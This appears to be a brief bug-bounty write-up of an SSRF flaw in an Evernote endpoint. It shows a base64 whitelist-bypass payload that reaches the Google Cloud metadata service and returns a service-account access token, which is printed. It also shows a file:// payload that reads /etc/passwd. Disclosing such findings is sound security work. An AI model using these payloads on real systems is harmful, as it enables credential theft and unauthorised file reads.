### Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion

https://hackerone.com/reports/1189367  

https://web.archive.org/web/20220331091630/https://blog.neolex.dev/13/


Steps to reproduce

1. Found some juicy enpoints encoded in base64
  For e.g Decoding `L2Y2Y2RkNGJkZmE0YzFiODZmNDQxYzdjMjlmMDcyZTUxMWRkMzQ1MDEuY3Nz` gives you `/f6cdd4bdfa4c1b86f441c7c29f072e511dd34501.css`
2. As the data `f6cdd4bdfa4c1b86f441c7c29f072e511dd34501.css` is reflected in the response attacker though of SSRF
3. Attacker tried to provide internal IP address such as `http://169.254.169.254` by encoding to base64 but it didn't worked after few hit and trial attacker learned about whitelisting which only allow file ending with `.css` or `.js`

He used the following payload 
```
https://www.evernote.com/ro/aHR0cDovL21ldGFkYXRhLmdvb2dsZS5pbnRlcm5hbC9jb21wdXRlTWV0YWRhdGEvdjFiZXRhMS9pbnN0YW5jZS9zZXJ2aWNlLWFjY291bnRzL2RlZmF1bHQvdG9rZW4jLmpz/-1430533899.js
```

Which get's decoded to 

```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token#.js
```

5. Attacker is able to get the access token 
```
{"access_token":"ya29.c.Ko4B_gd-ROPkMva4XDYr-U2r-G_KMv8hy6ViP1f3kotzmmW9aiK8Zphl0QSOEBgqTSiBYtV-Yuy6-innnpf-0IQEgmBqWU_wT2ZYmGjceeyNB79WxYgDnBrOegozvYYOenisR-xBnkDX_AzAFGsDaToQ87QNHNjpK8CLeoFb3jZkO4D7mn532qv7NYuD9CIH0w","expires_in":2298,"token_type":"Bearer"};
```

7. Attacker was able to get internal file as well using file inclusion
```
file:///etc/passwd#.js
```


